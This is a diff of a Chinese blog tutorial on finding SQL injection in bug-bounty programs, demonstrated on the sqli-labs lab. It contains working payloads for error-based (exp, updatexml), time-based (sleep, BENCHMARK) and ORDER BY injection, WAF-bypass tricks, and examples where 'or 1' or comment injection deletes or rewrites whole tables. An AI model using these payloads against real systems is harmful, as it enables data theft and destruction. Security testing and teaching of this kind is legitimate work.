@@ -1,15 +1,4 @@
----
-title: SQL注入漏洞挖掘和绕过
-date: '2026-08-10 15:16:59'
-tags: []
-categories:
-  - 漏洞挖掘
-slug: SQL注入漏洞挖掘和绕过
-permalink: /sql
-draft: false
----
-
-sql 注入这个漏洞老生常谈了，但是很多师傅只能挖到公益 src，并不能挖到 src 中的注入，那是因为在 src 中，他们系统开发会有代码自动审计平替，还有的会进行漏洞的扫描，太常规的漏洞再次之前估计就被解决了，但是这不代表不存在漏洞！因为最近几年的规范化代码开发和安全意识培训，sql 注入相比于几年之前确实少了很多，但是 src 中仍然会存在很多！因为需要交互的地方很多都需要插入到数据库中，而大量的交互总会有漏网之鱼，也总有扫描器爬取不到的地方，并且很多防御注入比如预编译，也不少任何时候都能使用的，因此就导致了很多的注入的漏洞。
+ sql 注入这个漏洞老生常谈了，但是很多师傅只能挖到公益 src，并不能挖到 src 中的注入，那是因为在 src 中，他们系统开发会有代码自动审计平替，还有的会进行漏洞的扫描，太常规的漏洞再次之前估计就被解决了，但是这不代表不存在漏洞！因为最近几年的规范化代码开发和安全意识培训，sql 注入相比于几年之前确实少了很多，但是 src 中仍然会存在很多！因为需要交互的地方很多都需要插入到数据库中，而大量的交互总会有漏网之鱼，也总有扫描器爬取不到的地方，并且很多防御注入比如预编译，也不少任何时候都能使用的，因此就导致了很多的注入的漏洞。
 
 **本篇文章以sqli-labs靶场为例**
 
@@ -58,7 +47,7 @@ id=-1 || 1=1
 id=-1 || 1=2
 ```
 **可以看到，如果是 id=1 or 1，就会查询出所有内容，如果是 delete 方法，就会造成全部删库。**
-![](/images/20260810151700.png)
+![](/images/20260810153331.png)
 #### （2）报错法
 **报错法就是使用 exp()方法，该方法在 709 数值之内不会报错，当大于等于 710，就会报错。**
 ```
@@ -68,11 +57,11 @@ id = 1 and exp(710) # 报错
 
 看下面的 payload，在 and exp(709)的时候不会报错。
 
-![](/images/20260810151702.png)
+![](/images/20260810153331_1.png)
 
 当 and exp(710)的时候就会进行报错。
 
-![](/images/20260810151705.png)
+![](/images/20260810153331_2.png)
 #### （3）延时法
 ```
 id = 1 and sleep(5);
@@ -80,7 +69,7 @@ id = 1 and sleep(5);
 id = 1 and BENCHMARK(200000000,(1=1)); # 效果：MySQL 会强行将 1=1 这个简单表达式循环计算 2 亿次。这会瞬间耗尽 CPU 资源，导致该查询的响应时间从毫秒级变为数秒甚至数十秒
 ```
 
-![](/images/20260810151707.png)
+![](/images/20260810153331_3.png)
 
 ## 4、SQL注入中常用的技巧
 ### 4.1 like的用法
@@ -110,7 +99,7 @@ SELECT * FROM users WHERE username LIKE 'j_smith'; # 这将匹配 username 是�
 ### 4.2 exp的用法
 在SQL注入中，`exp()` 函数主要作为一种**报错注入** 的技术被攻击者利用。它的核心原理是：**通过构造恶意输入，让 `exp()` 函数触发一个数据库“溢出”错误，并将攻击者想要窃取的数据“夹带”在错误信息中一同返回**。
 简单来说：在 mysql 中，exp 的上限是 709，超过 709 会报错！
-![](/images/20260810151710.png)
+![](/images/20260810153331_4.png)
 ### 4.3 exp+like的用法
 在src中，很多情况下，审核要求你要有数据，哪怕是数据库名，或者表名，版本
 号也可以，因此就需要使用到 exp+like 进行匹配。
@@ -119,15 +108,15 @@ select * from student where id = '1' and exp(710-(database()like's%')) and '1'
 
 select * from users where id =1 and exp(710-database()like'd%');
 ```
-![](/images/20260810151712.png)
+![](/images/20260810153331_5.png)
 
 除了 database() ，也可以使用 user()，这样可以爆出当前用户名。
 
-![](/images/20260810151714.png)
+![](/images/20260810153331_6.png)
 
 还可以使用版本号去猜测
 
-![](/images/20260810151716.png)
+![](/images/20260810153331_7.png)
 ### 4.4 like被过滤
 ```
 select * from users where id = 1 and exp(710-ascii(CURRENT_USER));
@@ -139,7 +128,7 @@ select * from users where id = 1 and exp(823-ascii(CURRENT_USER));
 
 select * from users where id = 1 and exp(824-ascii(CURRENT_USER));
 ```
-![](/images/20260810151719.png)
+![](/images/20260810153331_8.png)
 ## 5、SQL注入绕WAF
 ### 5.1 内联注释
 **`/*!*/`** 叫做内联注释，当 **!** 后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为 SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
@@ -178,9 +167,9 @@ select * from users where id = 1 and exp(824-ascii(CURRENT_USER));
 /*%0a/fasfa221213*%0a*/
 /*/fasfa221ss%0a213*%0a*/
 ```
-![](/images/20260810151721.png)
+![](/images/20260810153331_9.png)
 
-![](/images/20260810151723.png)
+![](/images/20260810153331_10.png)
 
 ### 5.4 等号过滤
 ```
@@ -190,7 +179,7 @@ select * from users where id = 1 and exp(824-ascii(CURRENT_USER));
 
 ?id=1' and '1'<>'2  # 这个值不相等的时候，结果为真
 ```
-![](/images/20260810151725.png)
+![](/images/20260810153331_11.png)
 ### 5.5 函数替代
 #### （1）database()
 ```
@@ -390,85 +379,85 @@ constr 可以换成 constring
 ## 7、SRC中最常见的排序注入
 我们大家都知道，现在防范 sql 注入都是使用的预编译，但是预编译不是万能的，在排序中是无法使用的！比如order by、like、in
 下面这种情况就是直接拼接的 id，为什么不进行预编译呢？如果进行预编译，那么这个id 传入到数据库中就不再是整数了，而是一个字符类型，order by 在遇到字符类型是没法正常排序的！
-![](/images/20260810151727.png)
+![](/images/20260810153331_12.png)
 ### 7.1 and 1=1 判定失效
 在 order by 排序中，没法使用 and 1=1 和 and 1=2 来判定是否存在 sql 注入，因为他们的回显内容都完全一致
-![](/images/20260810151730.png)
+![](/images/20260810153331_13.png)
 ### 7.2 正确的判断方法
 既然 and 1=1 和 and 1=2 没法进行使用，那就使用 rand()这个随机数进行判定。通过 rand()，如果返回内容出现了变化，那就很明显是使用了 order by 进行了排序。
 ```
 select * from users order by rand();
 ```
-![](/images/20260810151733.png)
+![](/images/20260810153331_14.png)
 ### 7.3 判断出数据的方法
 使用 if 来判断数据
 ```
 select * from users order by if(1=1,username,password);
 ```
 
-![](/images/20260810151735.png)
+![](/images/20260810153331_15.png)
 ```
 select * from users order by if(database()like's%',username,password);
 
 select * from users order by
 if(database()like's%',sleep(3),password);
 ```
-![](/images/20260810151738.png)
+![](/images/20260810153331_16.png)
 ### 7.4 可以支持报错注入
 ```
 select * from users order by updatexml(1,if(1=2,1,(user())),1);
 ```
-![](/images/20260810151741.png)
+![](/images/20260810153331_17.png)
 ## 8、SQL注入时所需注意的点
 **谨慎使用or和--+** 在现实的SRC中可能导致删库行为
 ### 8.1 or导致删库的情况
 #### （1）updata导致的全表更改
 正常的 update 更改，存在限制，只更改一行。
-![](/images/20260810151743.png)
+![](/images/20260810153331_18.png)
 
 使用 or 之后，尤其是 or 1 导致的永真。会导致整个库全部被改！
 
-![](/images/20260810151745.png)
+![](/images/20260810153331_19.png)
 #### （2）delete导致的全表删除
 正常的删除逻辑
 ```
 delete from users where id = 14 and username="test";
 ```
-![](/images/20260810151748.png)
+![](/images/20260810153331_20.png)
 
 假设注入点在 id 上面，如果你使用了 or ，就会导致下面问题，直接全删了
 
-![](/images/20260810151750.png)
+![](/images/20260810153331_21.png)
 
 这个句子和下面这个是完全等价的，直接就是 or 1 永真了，导致库全删了。
 ```
 delete from users where id = 12 and username="test" or 1;
 ```
-![](/images/20260810151753.png)
+![](/images/20260810153331_22.png)
 ### 8.2 注释符--+导致删库的情况
 #### （1）update导致的全表更改
 正常的 update 语法，因为有 id=1 的限制
 ```
 update users set password = "123456" where username = "test" and id=1;
 ```
-![](/images/20260810151755.png)
+![](/images/20260810153331_23.png)
 如果使用 --+ 注释掉下一个 id 筛选限制，就会导致全部密码都被修改。
 ```
 update users set password = "123456" where username = "test" -- " and id=1;
 ```
-![](/images/20260810151757.png)
+![](/images/20260810153331_24.png)
 #### （2）delete导致的全表删除
 正常的删除操作，也是因为有 id 的限制，每次只能删除一条。
 ```
 delete from users where username = "test" and id = 1;
 ```
 
-![](/images/20260810151800.png)
+![](/images/20260810153331_25.png)
 如果注入点出现在 username，你使用了 --+ 就可能导致下面情况。原本的 id 限制没了，直接导致删库了。
 ```
 delete from users where username = "test" or 1 -- " and id = 1;
 ```
-![](/images/20260810151802.png)
+![](/images/20260810153331_26.png)
 
 ## 9、SQL注入半自动化插件--xia SQL
 
@@ -509,3 +498,4 @@ Repeater 手动复核布尔/报错/时间
 sqlmap / xray 深入利用(打库、出数据)
 ```
 - README 原话:**"如果需要所有注入都测试,请把 burp 的流量转发到 xray"**——xia SQL 负责筛,批量深挖交给 xray。
+
